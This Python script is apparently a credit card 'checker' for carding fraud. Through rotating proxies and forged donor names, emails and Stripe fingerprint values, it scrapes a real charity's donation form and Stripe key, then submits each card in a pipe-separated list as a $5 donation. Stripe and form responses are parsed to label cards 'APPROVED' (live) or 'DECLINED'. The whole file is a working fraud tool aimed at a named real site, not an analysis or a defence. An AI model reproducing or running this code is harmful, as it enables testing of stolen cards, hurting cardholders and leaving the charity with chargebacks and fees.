import requests
import random
import string
from bs4 import BeautifulSoup
import re
import json
from proxy_manager import get_proxy_dict

def generate_random_name():
    first_names = ['James', 'Michael', 'Robert', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Daniel']
    last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Wilson', 'Taylor']
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def generate_random_email():
    name = generate_random_name().replace(" ", "").lower()
    domains = ['gmail.com', 'yahoo.com', 'outlook.com']
    return f"{name}{random.randint(100,9999)}@{random.choice(domains)}"

def generate_guid():
    return f"{random.randbytes(4).hex()}-{random.randbytes(2).hex()}-{random.randbytes(2).hex()}-{random.randbytes(2).hex()}-{random.randbytes(6).hex()}"

def get_fresh_session_data():
    session = requests.Session()
    proxies = get_proxy_dict()
    
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    })
    
    try:
        response = session.get('https://ccfoundationorg.com/donate/', timeout=15, proxies=proxies)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        nonce_input = soup.find('input', {'name': '_charitable_donation_nonce'})
        nonce = nonce_input.get('value') if nonce_input else None
        
        form_id_input = soup.find('input', {'name': 'charitable_form_id'})
        form_id = form_id_input.get('value') if form_id_input else None
        
        pk_match = re.search(r'pk_live_[A-Za-z0-9]+', response.text)
        stripe_key = pk_match.group(0) if pk_match else 'pk_live_51IGkkVAgdYEhlUBFnXi5eN0WC8T5q7yyDOjZfj3wGc93b2MAxq0RvWwOdBdGIl7enL3Lbx27n74TTqElkVqk5fhE00rUuIY5Lp'
        
        return {
            'session': session,
            'nonce': nonce,
            'form_id': form_id,
            'stripe_key': stripe_key,
            'cookies': dict(session.cookies),
            'proxies': proxies
        }
    except Exception as e:
        return None

def check_card(card_data: str, session_data: dict = None) -> dict:
    try:
        parts = card_data.strip().split('|')
        if len(parts) != 4:
            return {
                'card': card_data,
                'status': 'INVALID',
                'message': 'Invalid format',
                'approved': False
            }
        
        n = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()[-2:]
        cvc = parts[3].strip()
        
        fresh = session_data if session_data else get_fresh_session_data()
        if not fresh or not fresh.get('nonce') or not fresh.get('form_id'):
            return {
                'card': card_data,
                'status': 'ERROR',
                'message': 'Failed to get fresh session',
                'approved': False
            }
        
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
        })
        if fresh.get('cookies'):
            session.cookies.update(fresh['cookies'])
        nonce = fresh['nonce']
        form_id = fresh['form_id']
        stripe_key = fresh['stripe_key']
        proxies = fresh.get('proxies')
        
        name = generate_random_name()
        email = generate_random_email()
        guid = generate_guid()
        muid = generate_guid()
        sid = generate_guid()
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        data = f'type=card&billing_details[name]={name}&billing_details[email]={email}&billing_details[address][line1]=123+Main+St&billing_details[address][postal_code]=10080&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F014aea9fff%3B+stripe-js-v3%2F014aea9fff%3B+card-element&referrer=https%3A%2F%2Fccfoundationorg.com&time_on_page={random.randint(50000, 100000)}&key={stripe_key}'
        
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20, proxies=proxies)
        response_json = response.json()
        
        if 'error' in response_json:
            err = response_json['error']
            error_msg = err.get('message', 'Unknown error')
            error_code = err.get('code', '')
            decline_code = err.get('decline_code', '')
            
            if 'insufficient_funds' in error_msg.lower() or decline_code == 'insufficient_funds':
                return {'card': card_data, 'status': 'APPROVED', 'message': 'Insufficient Funds (CVV Match)', 'approved': True}
            elif 'incorrect_cvc' in error_msg.lower() or error_code == 'incorrect_cvc':
                return {'card': card_data, 'status': 'APPROVED', 'message': 'Incorrect CVC (Live Card)', 'approved': True}
            elif 'incorrect_number' in error_code or 'invalid' in error_code:
                return {'card': card_data, 'status': 'DECLINED', 'message': 'Invalid Card Number', 'approved': False}
            elif 'expired' in error_code:
                return {'card': card_data, 'status': 'DECLINED', 'message': 'Expired Card', 'approved': False}
            
            return {'card': card_data, 'status': 'DECLINED', 'message': error_msg[:100], 'approved': False}
        
        pm_id = response_json.get('id')
        if not pm_id:
            return {'card': card_data, 'status': 'DECLINED', 'message': 'Failed to create payment method', 'approved': False}
        
        headers2 = {
            'authority': 'ccfoundationorg.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://ccfoundationorg.com',
            'referer': 'https://ccfoundationorg.com/donate/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        first_name = name.split()[0]
        last_name = name.split()[1] if ' ' in name else 'Smith'
        
        data2 = {
            'charitable_form_id': form_id,
            form_id: '',
            '_charitable_donation_nonce': nonce,
            '_wp_http_referer': '/donate/',
            'campaign_id': '988003',
            'description': 'CC Foundation Donation Form',
            'ID': '1056420',
            'donation_amount': 'custom',
            'custom_donation_amount': '5.00',
            'recurring_donation': '',
            'title': 'Mr',
            'first_name': first_name,
            'last_name': last_name,
            'email': email,
            'address': '123 Main St',
            'postcode': '10080',
            'gateway': 'stripe',
            'stripe_payment_method': pm_id,
            'action': 'make_donation',
            'form_action': 'make_donation',
        }
        
        response2 = session.post('https://ccfoundationorg.com/wp-admin/admin-ajax.php', headers=headers2, data=data2, timeout=25, proxies=proxies)
        
        try:
            result = response2.json()
        except:
            result = {'raw': response2.text[:300]}
        
        msg = str(result)
        
        if isinstance(result, dict):
            if result.get('success') == True:
                return {'card': card_data, 'status': 'APPROVED', 'message': 'Charged $5', 'approved': True}
            
            if 'errors' in result:
                errors = result.get('errors', {})
                if isinstance(errors, dict):
                    for key, val in errors.items():
                        if isinstance(val, list) and val:
                            error_text = val[0].lower()
                            if 'insufficient_funds' in error_text or 'insufficient funds' in error_text:
                                return {'card': card_data, 'status': 'APPROVED', 'message': 'Insufficient Funds (CVV Match)', 'approved': True}
                            elif 'incorrect_cvc' in error_text or 'security code' in error_text:
                                return {'card': card_data, 'status': 'APPROVED', 'message': 'Incorrect CVC (Live Card)', 'approved': True}
                            elif 'card_declined' in error_text or 'generic_decline' in error_text or 'declined' in error_text:
                                return {'card': card_data, 'status': 'DECLINED', 'message': 'Card Declined', 'approved': False}
                            elif 'do_not_honor' in error_text:
                                return {'card': card_data, 'status': 'DECLINED', 'message': 'Do Not Honor', 'approved': False}
                            elif 'stolen' in error_text or 'lost' in error_text:
                                return {'card': card_data, 'status': 'DECLINED', 'message': 'Lost/Stolen Card', 'approved': False}
                            elif 'expired' in error_text:
                                return {'card': card_data, 'status': 'DECLINED', 'message': 'Expired Card', 'approved': False}
                            elif 'requires_action' in error_text or '3d' in error_text:
                                return {'card': card_data, 'status': 'APPROVED', 'message': '3D Secure Required', 'approved': True}
                            else:
                                return {'card': card_data, 'status': 'DECLINED', 'message': val[0][:80], 'approved': False}
        
        msg_lower = msg.lower()
        if 'requires_action' in msg_lower:
            return {'card': card_data, 'status': 'APPROVED', 'message': '3D Secure Required', 'approved': True}
        elif 'insufficient_funds' in msg_lower:
            return {'card': card_data, 'status': 'APPROVED', 'message': 'Insufficient Funds (CVV Match)', 'approved': True}
        elif 'incorrect_cvc' in msg_lower:
            return {'card': card_data, 'status': 'APPROVED', 'message': 'Incorrect CVC (Live Card)', 'approved': True}
        elif 'success' in msg_lower and 'true' in msg_lower:
            return {'card': card_data, 'status': 'APPROVED', 'message': 'Charged $5', 'approved': True}
        else:
            return {'card': card_data, 'status': 'DECLINED', 'message': msg[:100] if len(msg) > 100 else msg, 'approved': False}

    except Exception as e:
        return {'card': card_data, 'status': 'ERROR', 'message': str(e)[:80], 'approved': False}
